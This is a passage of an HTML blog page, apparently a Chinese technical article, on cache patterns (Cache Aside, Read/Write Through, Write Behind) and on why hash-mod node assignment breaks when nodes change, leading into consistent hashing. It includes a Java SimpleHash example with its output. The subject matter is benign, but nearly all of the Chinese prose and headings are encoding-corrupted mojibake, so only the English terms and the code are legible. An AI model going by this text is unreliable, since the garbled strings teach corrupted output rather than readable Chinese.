<li>å¢åŠ  cache æ›´æ–°é‡è¯•æœºåˆ¶ï¼ˆå¸¸ç”¨ï¼‰ï¼š å¦‚æœcacheæœåŠ¡å½“å‰ä¸å¯ç”¨å¯¼è‡´ç¼“å­˜åˆ é™¤å¤±è´¥çš„è¯ï¼Œéš”ä¸€æ®µæ—¶é—´è¿›è¡Œé‡è¯•ï¼Œé‡è¯•æ¬¡æ•°å¯ä»¥è‡ªå·±å®šã€‚å¦‚æœå¤šæ¬¡é‡è¯•è¿˜æ˜¯å¤±è´¥çš„è¯ï¼Œå¯ä»¥æŠŠå½“å‰æ›´æ–°å¤±è´¥çš„ key å­˜å…¥é˜Ÿåˆ—ä¸­ï¼Œç­‰ç¼“å­˜æœåŠ¡å¯ç”¨ä¹‹åï¼Œå†å°†ç¼“å­˜ä¸­å¯¹åº”çš„ key åˆ é™¤å³å¯ã€‚</li>
</ol>
<p>Cache Aside Pattern æ˜¯å¹³æ—¶ä½¿ç”¨æ¯”è¾ƒå¤šçš„ä¸€ä¸ªç¼“å­˜è¯»å†™æ¨¡å¼ï¼Œæ¯”è¾ƒé€‚åˆè¯»è¯·æ±‚æ¯”è¾ƒå¤šçš„åœºæ™¯ã€‚</p>
<p>Cache Aside Patternä¸­æœåŠ¡ç«¯éœ€è¦åŒæ—¶ç»´ç³»DBå’Œ cacheï¼Œå¹¶ä¸”æ˜¯ä»¥ DB çš„ç»“æœä¸ºå‡†ã€‚</p>
<p>æ—è·¯ç¼“å­˜æ¨¡å¼ä¸‹çš„ç¼“å­˜è¯»å†™æ­¥éª¤ï¼š</p>
<p><strong>å†™</strong> ï¼š</p>
<ul>
<li>å…ˆæ›´æ–°DB</li>
<li>ç„¶åç›´æ¥åˆ é™¤cache</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261425138.png" alt="img"></p>
<p><strong>è¯»</strong> :</p>
<ul>
<li>ä» cache ä¸­è¯»å–æ•°æ®ï¼Œè¯»å–åˆ°å°±ç›´æ¥è¿”å›</li>
<li>cacheä¸­è¯»å–ä¸åˆ°çš„è¯ï¼Œå°±ä» DB ä¸­è¯»å–æ•°æ®è¿”å›</li>
<li>å†æŠŠæ•°æ®æ”¾åˆ° cache ä¸­ã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261425172.png" alt="img"></p>
<h4 id="åœ¨å†™æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥å…ˆåˆ é™¤-cache-ï¼Œåæ›´æ–°-DB-ä¹ˆï¼Ÿ"><a href="#åœ¨å†™æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥å…ˆåˆ é™¤-cache-ï¼Œåæ›´æ–°-DB-ä¹ˆï¼Ÿ" class="headerlink" title="åœ¨å†™æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥å…ˆåˆ é™¤ cache ï¼Œåæ›´æ–° DB ä¹ˆï¼Ÿ"></a>åœ¨å†™æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå¯ä»¥å…ˆåˆ é™¤ cache ï¼Œåæ›´æ–° DB ä¹ˆï¼Ÿ</h4><p>è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼å› ä¸ºè¿™æ ·å¯èƒ½ä¼šé€ æˆ<strong>æ•°æ®åº“ï¼ˆDBï¼‰å’Œç¼“å­˜ï¼ˆCacheï¼‰æ•°æ®ä¸ä¸€è‡´</strong>çš„é—®é¢˜ã€‚</p>
<p>ä¾‹å¦‚ï¼š</p>
<p>æ•°æ®A&#x3D;10ã€‚è¯·æ±‚1å†™æ•°æ®A&#x3D;20ï¼Œå…ˆæŠŠcacheä¸­çš„Aæ•°æ®åˆ é™¤ -&gt; è¯·æ±‚2å…ˆä»cacheä¸­è¯»Aï¼Œå‘ç°æ²¡æœ‰åä»DBä¸­è¯»å–æ•°æ®A&#x3D;10ï¼Œç„¶åæ›´æ–°åˆ°cacheä¸­-&gt;è¯·æ±‚1å†æŠŠDBä¸­çš„Aæ•°æ®æ›´æ–°ä¸º20ã€‚æ­¤æ—¶cacheä¸­A&#x3D;10ï¼Œæ•°æ®åº“ä¸­A&#x3D;20ã€‚</p>
<h4 id="åœ¨å†™æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå…ˆæ›´æ–°DBï¼Œååˆ é™¤cacheå°±æ²¡æœ‰é—®é¢˜äº†ä¹ˆï¼Ÿ"><a href="#åœ¨å†™æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå…ˆæ›´æ–°DBï¼Œååˆ é™¤cacheå°±æ²¡æœ‰é—®é¢˜äº†ä¹ˆï¼Ÿ" class="headerlink" title="åœ¨å†™æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå…ˆæ›´æ–°DBï¼Œååˆ é™¤cacheå°±æ²¡æœ‰é—®é¢˜äº†ä¹ˆï¼Ÿ"></a>åœ¨å†™æ•°æ®çš„è¿‡ç¨‹ä¸­ï¼Œå…ˆæ›´æ–°DBï¼Œååˆ é™¤cacheå°±æ²¡æœ‰é—®é¢˜äº†ä¹ˆï¼Ÿ</h4><p>ç†è®ºä¸Šæ¥è¯´è¿˜æ˜¯å¯èƒ½ä¼šå‡ºç°æ•°æ®ä¸ä¸€è‡´æ€§çš„é—®é¢˜ï¼Œä¸è¿‡æ¦‚ç‡éå¸¸å°ï¼Œå› ä¸ºç¼“å­˜çš„å†™å…¥é€Ÿåº¦æ˜¯æ¯”æ•°æ®åº“çš„å†™å…¥é€Ÿåº¦å¿«å¾ˆå¤šï¼</p>
<p>ä¾‹å¦‚ï¼š</p>
<p>æ•°æ®A&#x3D;10ã€‚è¯·æ±‚1ä»DBè¯»æ•°æ®A&#x3D;10 -&gt;è¯·æ±‚2å†™æ›´æ–°æ•°æ® A &#x3D; 20åˆ°æ•°æ®åº“å¹¶åˆ é™¤cacheä¸­çš„Aæ•°æ® -&gt; è¯·æ±‚1å°†æ•°æ®Aå†™å…¥cacheã€‚æ­¤æ—¶cacheä¸­A&#x3D;10ï¼Œæ•°æ®åº“ä¸­A&#x3D;20ã€‚</p>
<h4 id="Cache-Aside-Pattern-çš„ç¼ºé™·ã€‚"><a href="#Cache-Aside-Pattern-çš„ç¼ºé™·ã€‚" class="headerlink" title="Cache Aside Pattern çš„ç¼ºé™·ã€‚"></a>Cache Aside Pattern çš„ç¼ºé™·ã€‚</h4><p><strong>ç¼ºé™·1ï¼šé¦–æ¬¡è¯·æ±‚æ•°æ®ä¸€å®šä¸åœ¨ cache çš„é—®é¢˜</strong></p>
<p>è§£å†³åŠæ³•ï¼šå¯ä»¥å°†çƒ­ç‚¹æ•°æ®å¯ä»¥æå‰æ”¾å…¥cache ä¸­ã€‚</p>
<p><strong>ç¼ºé™·2ï¼šå†™æ“ä½œæ¯”è¾ƒé¢‘ç¹çš„è¯å¯¼è‡´cacheä¸­çš„æ•°æ®ä¼šè¢«é¢‘ç¹è¢«åˆ é™¤ï¼Œè¿™æ ·ä¼šå½±å“ç¼“å­˜å‘½ä¸­ç‡ ã€‚</strong></p>
<p>è§£å†³åŠæ³•ï¼š</p>
<ul>
<li>æ•°æ®åº“å’Œç¼“å­˜æ•°æ®å¼ºä¸€è‡´åœºæ™¯ ï¼šæ›´æ–°DBçš„æ—¶å€™åŒæ ·æ›´æ–°cacheï¼Œä¸è¿‡æˆ‘ä»¬éœ€è¦åŠ ä¸€ä¸ªé”&#x2F;åˆ†å¸ƒå¼é”æ¥ä¿è¯æ›´æ–°cacheçš„æ—¶å€™ä¸å­˜åœ¨çº¿ç¨‹å®‰å…¨é—®é¢˜ã€‚</li>
<li>å¯ä»¥çŸ­æš‚åœ°å…è®¸æ•°æ®åº“å’Œç¼“å­˜æ•°æ®ä¸ä¸€è‡´çš„åœºæ™¯ ï¼šæ›´æ–°DBçš„æ—¶å€™åŒæ ·æ›´æ–°cacheï¼Œä½†æ˜¯ç»™ç¼“å­˜åŠ ä¸€ä¸ªæ¯”è¾ƒçŸ­çš„è¿‡æœŸæ—¶é—´ï¼Œè¿™æ ·çš„è¯å°±å¯ä»¥ä¿è¯å³ä½¿æ•°æ®ä¸ä¸€è‡´çš„è¯å½±å“ä¹Ÿæ¯”è¾ƒå°ã€‚</li>
</ul>
<h3 id="Read-x2F-Write-Through-Patternï¼ˆè¯»å†™ç©¿é€æ¨¡å¼ï¼‰"><a href="#Read-x2F-Write-Through-Patternï¼ˆè¯»å†™ç©¿é€æ¨¡å¼ï¼‰" class="headerlink" title="Read&#x2F;Write Through Patternï¼ˆè¯»å†™ç©¿é€æ¨¡å¼ï¼‰"></a>Read&#x2F;Write Through Patternï¼ˆè¯»å†™ç©¿é€æ¨¡å¼ï¼‰</h3><p>Read&#x2F;Write Through Pattern ä¸­æœåŠ¡ç«¯æŠŠ cache è§†ä¸ºä¸»è¦æ•°æ®å­˜å‚¨ï¼Œä»ä¸­è¯»å–æ•°æ®å¹¶å°†æ•°æ®å†™å…¥å…¶ä¸­ã€‚cache æœåŠ¡è´Ÿè´£å°†æ­¤æ•°æ®è¯»å–å’Œå†™å…¥ DBï¼Œä»è€Œå‡è½»äº†åº”ç”¨ç¨‹åºçš„èŒè´£ã€‚</p>
<p>è¿™ç§ç¼“å­˜è¯»å†™ç­–ç•¥åœ¨å¹³æ—¶åœ¨å¼€å‘è¿‡ç¨‹ä¸­éå¸¸å°‘è§ã€‚æŠ›å»æ€§èƒ½æ–¹é¢çš„å½±å“ï¼Œå¤§æ¦‚ç‡æ˜¯å› ä¸ºç»å¸¸ä½¿ç”¨çš„åˆ†å¸ƒå¼ç¼“å­˜ Redis å¹¶æ²¡æœ‰æä¾› cache å°†æ•°æ®å†™å…¥DBçš„åŠŸèƒ½ã€‚</p>
<p><strong>å†™ï¼ˆWrite Throughï¼‰ï¼š</strong></p>
<ul>
<li>å…ˆæŸ¥cacheï¼Œcacheä¸­ä¸å­˜åœ¨ï¼Œç›´æ¥æ›´æ–°DBã€‚</li>
<li>cacheä¸­å­˜åœ¨ï¼Œåˆ™å…ˆæ›´æ–°cacheï¼Œç„¶å cache æœåŠ¡è‡ªå·±æ›´æ–° DBï¼ˆ<strong>åŒæ­¥æ›´æ–° cache å’Œ DB</strong>ï¼‰ã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261425273.png" alt="img"></p>
<p><strong>è¯»(Read Through)ï¼š</strong></p>
<ul>
<li>ä» cache ä¸­è¯»å–æ•°æ®ï¼Œè¯»å–åˆ°å°±ç›´æ¥è¿”å› ã€‚</li>
<li>è¯»å–ä¸åˆ°çš„è¯ï¼Œå…ˆä» DB åŠ è½½ï¼Œå†™å…¥åˆ° cache åè¿”å›å“åº”ã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202261425333.png" alt="img"></p>
<p>Read-Through Pattern å®é™…åªæ˜¯åœ¨ Cache-Aside Pattern ä¹‹ä¸Šè¿›è¡Œäº†å°è£…ã€‚åœ¨ Cache-Aside Pattern ä¸‹ï¼Œå‘ç”Ÿè¯»è¯·æ±‚çš„æ—¶å€™ï¼Œå¦‚æœ cache ä¸­ä¸å­˜åœ¨å¯¹åº”çš„æ•°æ®ï¼Œæ˜¯ç”±å®¢æˆ·ç«¯è‡ªå·±è´Ÿè´£æŠŠæ•°æ®å†™å…¥ cacheï¼Œè€Œ Read Through Pattern åˆ™æ˜¯ cache æœåŠ¡è‡ªå·±æ¥å†™å…¥ç¼“å­˜çš„ï¼Œè¿™å¯¹å®¢æˆ·ç«¯æ˜¯é€æ˜çš„ã€‚</p>
<p>å’Œ Cache Aside Pattern ä¸€æ ·ï¼Œ Read-Through Pattern ä¹Ÿæœ‰é¦–æ¬¡è¯·æ±‚æ•°æ®ä¸€å®šä¸åœ¨ cache çš„é—®é¢˜ï¼Œå¯¹äºçƒ­ç‚¹æ•°æ®å¯ä»¥æå‰æ”¾å…¥ç¼“å­˜ä¸­ã€‚</p>
<h3 id="Write-Behind-Patternï¼ˆå¼‚æ­¥ç¼“å­˜å†™å…¥ï¼‰"><a href="#Write-Behind-Patternï¼ˆå¼‚æ­¥ç¼“å­˜å†™å…¥ï¼‰" class="headerlink" title="Write Behind Patternï¼ˆå¼‚æ­¥ç¼“å­˜å†™å…¥ï¼‰"></a>Write Behind Patternï¼ˆå¼‚æ­¥ç¼“å­˜å†™å…¥ï¼‰</h3><p>Write Behind Pattern å’Œ Read&#x2F;Write Through Pattern å¾ˆç›¸ä¼¼ï¼Œä¸¤è€…éƒ½æ˜¯ç”± cache æœåŠ¡æ¥è´Ÿè´£ cache å’Œ DB çš„è¯»å†™ã€‚</p>
<p>ä½†æ˜¯ï¼Œä¸¤ä¸ªåˆæœ‰å¾ˆå¤§çš„ä¸åŒï¼š<strong>Read&#x2F;Write Through æ˜¯åŒæ­¥æ›´æ–° cache å’Œ DBï¼Œè€Œ Write Behind Caching åˆ™æ˜¯åªæ›´æ–°ç¼“å­˜ï¼Œä¸ç›´æ¥æ›´æ–° DBï¼Œè€Œæ˜¯æ”¹ä¸ºå¼‚æ­¥æ‰¹é‡çš„æ–¹å¼æ¥æ›´æ–° DBã€‚</strong></p>
<p>è¿™ç§æ–¹å¼å¯¹æ•°æ®ä¸€è‡´æ€§å¸¦æ¥äº†æ›´å¤§çš„æŒ‘æˆ˜ï¼Œæ¯”å¦‚cacheæ•°æ®å¯èƒ½è¿˜æ²¡å¼‚æ­¥æ›´æ–°DBçš„è¯ï¼ŒcacheæœåŠ¡å¯èƒ½å°±å°±æŒ‚æ‰äº†ã€‚</p>
<p>è¿™ç§ç­–ç•¥å¹³æ—¶å¼€å‘è¿‡ç¨‹ä¸­ä¹Ÿéå¸¸éå¸¸å°‘è§ï¼Œä½†æ˜¯ä¸ä»£è¡¨å®ƒçš„åº”ç”¨åœºæ™¯å°‘ï¼Œæ¯”å¦‚æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¶ˆæ¯çš„å¼‚æ­¥å†™å…¥ç£ç›˜ã€MySQL çš„ InnoDB Buffer Pool æœºåˆ¶éƒ½ç”¨åˆ°äº†è¿™ç§ç­–ç•¥ã€‚</p>
<p>Write Behind Pattern ä¸‹ DB çš„å†™æ€§èƒ½éå¸¸é«˜ï¼Œéå¸¸é€‚åˆä¸€äº›æ•°æ®ç»å¸¸å˜åŒ–åˆå¯¹æ•°æ®ä¸€è‡´æ€§è¦æ±‚æ²¡é‚£ä¹ˆé«˜çš„åœºæ™¯ï¼Œæ¯”å¦‚æµè§ˆé‡ã€ç‚¹èµé‡ã€‚</p>
<h2 id="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•"><a href="#ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•" class="headerlink" title="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•"></a>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•</h2><p>å½“æ•°æ®å¤ªå¤§è€Œæ— æ³•å­˜å‚¨åœ¨ä¸€ä¸ªèŠ‚ç‚¹æˆ–æœºå™¨ä¸Šæ—¶ï¼Œç³»ç»Ÿä¸­éœ€è¦å¤šä¸ªè¿™æ ·çš„èŠ‚ç‚¹æˆ–æœºå™¨æ¥å­˜å‚¨å®ƒã€‚æ¯”å¦‚ï¼Œä½¿ç”¨å¤šä¸ª Web ç¼“å­˜ä¸­é—´ä»¶çš„ç³»ç»Ÿã€‚<strong>é‚£å¦‚ä½•ç¡®å®šå“ªä¸ª key å­˜å‚¨åœ¨å“ªä¸ªèŠ‚ç‚¹ä¸Šï¼Ÿé’ˆå¯¹è¯¥é—®é¢˜ï¼Œæœ€ç®€å•çš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨å“ˆå¸Œå–æ¨¡æ¥ç¡®å®šã€‚</strong> ç»™å®šä¸€ä¸ª keyï¼Œå…ˆå¯¹ key è¿›è¡Œå“ˆå¸Œè¿ç®—ï¼Œå°†å…¶é™¤ä»¥ç³»ç»Ÿä¸­çš„èŠ‚ç‚¹æ•°ï¼Œç„¶åå°†è¯¥ key æ”¾å…¥è¯¥èŠ‚ç‚¹ã€‚åŒæ ·ï¼Œåœ¨è·å– key æ—¶ï¼Œå¯¹ key è¿›è¡Œå“ˆå¸Œè¿ç®—ï¼Œå†é™¤ä»¥èŠ‚ç‚¹æ•°ï¼Œç„¶åè½¬åˆ°è¯¥èŠ‚ç‚¹å¹¶è·å–å€¼ã€‚ä¸Šè¿°è¿‡ç¨‹å¯¹åº”çš„å“ˆå¸Œç®—æ³•å®šä¹‰å¦‚ä¸‹ï¼š</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">node_number</span> = hash(key) % N <span class="comment"># å…¶ä¸­ N ä¸ºèŠ‚ç‚¹æ•°ã€‚</span></span><br></pre></td></tr></table></figure>

<p>ä¸‹å›¾æç»˜äº†å¤šèŠ‚ç‚¹ç³»ç»Ÿä¸­çš„ä¼ ç»Ÿçš„å“ˆå¸Œå–æ¨¡ç®—æ³•ï¼ŒåŸºäºè¯¥ç®—æ³•å¯ä»¥å®ç°ç®€å•çš„è´Ÿè½½å‡è¡¡ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242590.jpeg" alt="traditional-hashing.png"></p>
<h3 id="ä¼ ç»Ÿå“ˆå¸Œå–æ¨¡ç®—æ³•çš„å±€é™æ€§"><a href="#ä¼ ç»Ÿå“ˆå¸Œå–æ¨¡ç®—æ³•çš„å±€é™æ€§" class="headerlink" title="ä¼ ç»Ÿå“ˆå¸Œå–æ¨¡ç®—æ³•çš„å±€é™æ€§"></a>ä¼ ç»Ÿå“ˆå¸Œå–æ¨¡ç®—æ³•çš„å±€é™æ€§</h3><p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleHash</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> cap;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> seed;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleHash</span><span class="params">(<span class="type">int</span> cap, <span class="type">int</span> seed)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cap = cap;</span><br><span class="line">        <span class="built_in">this</span>.seed = seed;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(String value)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> value.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            result = seed * result + value.charAt(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (cap - <span class="number">1</span>) &amp; result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SimpleHash</span> <span class="variable">simpleHash</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleHash</span>(<span class="number">2</span> &lt;&lt; <span class="number">12</span>, <span class="number">8</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;node_number=hash(\&quot;semlinker\&quot;) % 3 -&gt; &quot;</span> + </span><br><span class="line">          simpleHash.hash(<span class="string">&quot;semlinker&quot;</span>) % <span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;node_number=hash(\&quot;kakuqo\&quot;) % 3 -&gt; &quot;</span> + </span><br><span class="line">          simpleHash.hash(<span class="string">&quot;kakuqo&quot;</span>) % <span class="number">3</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;node_number=hash(\&quot;test\&quot;) % 3 -&gt; &quot;</span> + </span><br><span class="line">          simpleHash.hash(<span class="string">&quot;test&quot;</span>) % <span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä»¥ä¸Šä»£ç æˆåŠŸè¿è¡Œåï¼Œåœ¨æ§åˆ¶å°ä¼šè¾“å‡ºä»¥ä¸‹ç»“æœï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node_number=hash(&quot;semlinker&quot;) % 3 -&gt; 1</span><br><span class="line">node_number=hash(&quot;kakuqo&quot;) % 3 -&gt; 2</span><br><span class="line">node_number=hash(&quot;test&quot;) % 3 -&gt; 0</span><br></pre></td></tr></table></figure>

<p>åŸºäºä»¥ä¸Šçš„è¾“å‡ºç»“æœï¼Œå¯ä»¥åˆ›å»ºä»¥ä¸‹è¡¨æ ¼ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242941.jpeg" alt="ch-three-nodes-hash.jpg"></p>
<h4 id="èŠ‚ç‚¹å‡å°‘çš„åœºæ™¯"><a href="#èŠ‚ç‚¹å‡å°‘çš„åœºæ™¯" class="headerlink" title="èŠ‚ç‚¹å‡å°‘çš„åœºæ™¯"></a>èŠ‚ç‚¹å‡å°‘çš„åœºæ™¯</h4><p><strong>åœ¨åˆ†å¸ƒå¼å¤šèŠ‚ç‚¹ç³»ç»Ÿä¸­ï¼Œå‡ºç°æ•…éšœå¾ˆå¸¸è§ã€‚ä»»ä½•èŠ‚ç‚¹éƒ½å¯èƒ½åœ¨æ²¡æœ‰ä»»ä½•äº‹å…ˆé€šçŸ¥çš„æƒ…å†µä¸‹æŒ‚æ‰ï¼Œé’ˆå¯¹è¿™ç§æƒ…å†µï¼ŒæœŸæœ›ç³»ç»Ÿåªæ˜¯å‡ºç°æ€§èƒ½é™ä½ï¼Œæ­£å¸¸çš„åŠŸèƒ½ä¸ä¼šå—åˆ°å½±å“ã€‚</strong> å‡è®¾å…¶ä¸­ 1 ä¸ªèŠ‚ç‚¹å‡ºç°æ•…éšœï¼Œè¿™æ—¶èŠ‚ç‚¹æ•°å‘ç”Ÿäº†å˜åŒ–ï¼ŒèŠ‚ç‚¹ä¸ªæ•°ä» 3 å‡å°‘ä¸º 2ï¼Œæ­¤æ—¶è¡¨æ ¼çš„çŠ¶æ€å‘ç”Ÿäº†å˜åŒ–ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242209.jpeg" alt="ch-two-nodes-hash.jpg"></p>
<p>å¾ˆæ˜æ˜¾èŠ‚ç‚¹çš„å‡å°‘ä¼šå¯¼è‡´é”®ä¸èŠ‚ç‚¹çš„æ˜ å°„å…³ç³»å‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¸ªå˜åŒ–å¯¹äºæ–°çš„é”®æ¥è¯´å¹¶ä¸ä¼šäº§ç”Ÿä»»ä½•å½±å“ï¼Œä½†å¯¹äºå·²æœ‰çš„é”®æ¥è¯´ï¼Œå°†å¯¼è‡´èŠ‚ç‚¹æ˜ å°„é”™è¯¯ï¼Œä»¥ â€œsemlinkerâ€ ä¸ºä¾‹ï¼Œå˜åŒ–å‰ç³»ç»Ÿæœ‰ 3 ä¸ªèŠ‚ç‚¹ï¼Œè¯¥é”®å¯¹åº”çš„èŠ‚ç‚¹ç¼–å·ä¸º 1ï¼Œå½“å‡ºç°æ•…éšœæ—¶ï¼ŒèŠ‚ç‚¹æ•°å‡å°‘ä¸º 2 ä¸ªï¼Œæ­¤æ—¶è¯¥é”®å¯¹åº”çš„èŠ‚ç‚¹ç¼–å·ä¸º 0ã€‚</p>
<h4 id="èŠ‚ç‚¹å¢åŠ çš„åœºæ™¯"><a href="#èŠ‚ç‚¹å¢åŠ çš„åœºæ™¯" class="headerlink" title="èŠ‚ç‚¹å¢åŠ çš„åœºæ™¯"></a>èŠ‚ç‚¹å¢åŠ çš„åœºæ™¯</h4><p><strong>åœ¨åˆ†å¸ƒå¼å¤šèŠ‚ç‚¹ç³»ç»Ÿä¸­ï¼Œå¯¹äºæŸäº›åœºæ™¯æ¯”å¦‚èŠ‚æ—¥å¤§ä¿ƒï¼Œå°±éœ€è¦å¯¹æœåŠ¡èŠ‚ç‚¹è¿›è¡Œæ‰©å®¹ï¼Œä»¥åº”å¯¹çªå‘çš„æµé‡ã€‚</strong>å‡è®¾è¿›è¡Œæ‰©å®¹ä¸´æ—¶å¢åŠ äº† 1 ä¸ªèŠ‚ç‚¹ï¼Œè¿™æ—¶èŠ‚ç‚¹æ•°å‘ç”Ÿäº†å˜åŒ–ï¼ŒèŠ‚ç‚¹ä¸ªæ•°ä» 3 å¢åŠ ä¸º 4 ä¸ªï¼Œæ­¤æ—¶è¡¨æ ¼çš„çŠ¶æ€å‘ç”Ÿäº†å˜åŒ–ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282242508.jpeg" alt="ch-four-nodes-hash.jpg"></p>
<p>å¾ˆæ˜æ˜¾èŠ‚ç‚¹çš„å¢åŠ ä¹Ÿä¼šå¯¼è‡´é”®ä¸èŠ‚ç‚¹çš„æ˜ å°„å…³ç³»å‘ç”Ÿå˜åŒ–ï¼Œè¿™ä¸ªå˜åŒ–å¯¹äºæ–°çš„é”®æ¥è¯´å¹¶ä¸ä¼šäº§ç”Ÿä»»ä½•å½±å“ï¼Œä½†å¯¹äºå·²æœ‰çš„é”®æ¥è¯´ï¼Œå°†å¯¼è‡´èŠ‚ç‚¹æ˜ å°„é”™è¯¯ï¼ŒåŒæ ·ä»¥ â€œsemlinkerâ€ ä¸ºä¾‹ï¼Œå˜åŒ–å‰ç³»ç»Ÿæœ‰ 3 ä¸ªèŠ‚ç‚¹ï¼Œè¯¥é”®å¯¹åº”çš„èŠ‚ç‚¹ç¼–å·ä¸º 1ï¼Œå½“å¢åŠ èŠ‚ç‚¹æ—¶ï¼ŒèŠ‚ç‚¹æ•°å¢åŠ ä¸º 4 ä¸ªï¼Œæ­¤æ—¶è¯¥é”®å¯¹åº”çš„èŠ‚ç‚¹ç¼–å·ä¸º 2ã€‚</p>
<p>å½“é›†ç¾¤ä¸­èŠ‚ç‚¹çš„æ•°é‡å‘ç”Ÿå˜åŒ–æ—¶ï¼Œä¹‹å‰çš„æ˜ å°„è§„åˆ™å°±å¯èƒ½å‘ç”Ÿå˜åŒ–ã€‚å¦‚æœé›†ç¾¤ä¸­æ¯ä¸ªæœºå™¨æä¾›çš„æœåŠ¡æ²¡æœ‰å·®åˆ«ï¼Œè¿™ä¸ä¼šæœ‰ä»€ä¹ˆå½±å“ã€‚<strong>ä½†å¯¹äºåˆ†å¸ƒå¼ç¼“å­˜è¿™ç§çš„ç³»ç»Ÿè€Œè¨€ï¼Œæ˜ å°„è§„åˆ™å¤±æ•ˆå°±æ„å‘³ç€ä¹‹å‰ç¼“å­˜çš„å¤±æ•ˆï¼Œè‹¥åŒä¸€æ—¶åˆ»å‡ºç°å¤§é‡çš„ç¼“å­˜å¤±æ•ˆï¼Œåˆ™å¯èƒ½ä¼šå‡ºç° â€œç¼“å­˜é›ªå´©â€ï¼Œè¿™å°†ä¼šé€ æˆç¾éš¾æ€§çš„åæœã€‚</strong></p>
<p><strong>è¦è§£å†³æ­¤é—®é¢˜ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨å…¶ä½™èŠ‚ç‚¹ä¸Šé‡æ–°åˆ†é…æ‰€æœ‰ç°æœ‰é”®ï¼Œè¿™å¯èƒ½æ˜¯éå¸¸æ˜‚è´µçš„æ“ä½œï¼Œå¹¶ä¸”å¯èƒ½å¯¹æ­£åœ¨è¿è¡Œçš„ç³»ç»Ÿäº§ç”Ÿä¸åˆ©å½±å“ã€‚å½“ç„¶é™¤äº†é‡æ–°åˆ†é…æ‰€æœ‰ç°æœ‰é”®çš„æ–¹æ¡ˆä¹‹å¤–ï¼Œè¿˜æœ‰å¦ä¸€ç§æ›´å¥½çš„æ–¹æ¡ˆå³ä½¿ç”¨ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ã€‚</strong></p>
<h3 id="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•-1"><a href="#ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•-1" class="headerlink" title="ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•"></a>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•</h3><p>ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•åœ¨ 1997 å¹´ç”±éº»çœç†å·¥å­¦é™¢æå‡ºï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„å“ˆå¸Œç®—æ³•ï¼Œåœ¨ç§»é™¤æˆ–è€…æ·»åŠ ä¸€ä¸ªæœåŠ¡å™¨æ—¶ï¼Œèƒ½å¤Ÿå°½å¯èƒ½å°åœ°æ”¹å˜å·²å­˜åœ¨çš„æœåŠ¡è¯·æ±‚ä¸å¤„ç†è¯·æ±‚æœåŠ¡å™¨ä¹‹é—´çš„æ˜ å°„å…³ç³»ã€‚ä¸€è‡´æ€§å“ˆå¸Œè§£å†³äº†ç®€å•å“ˆå¸Œç®—æ³•åœ¨åˆ†å¸ƒå¼<a 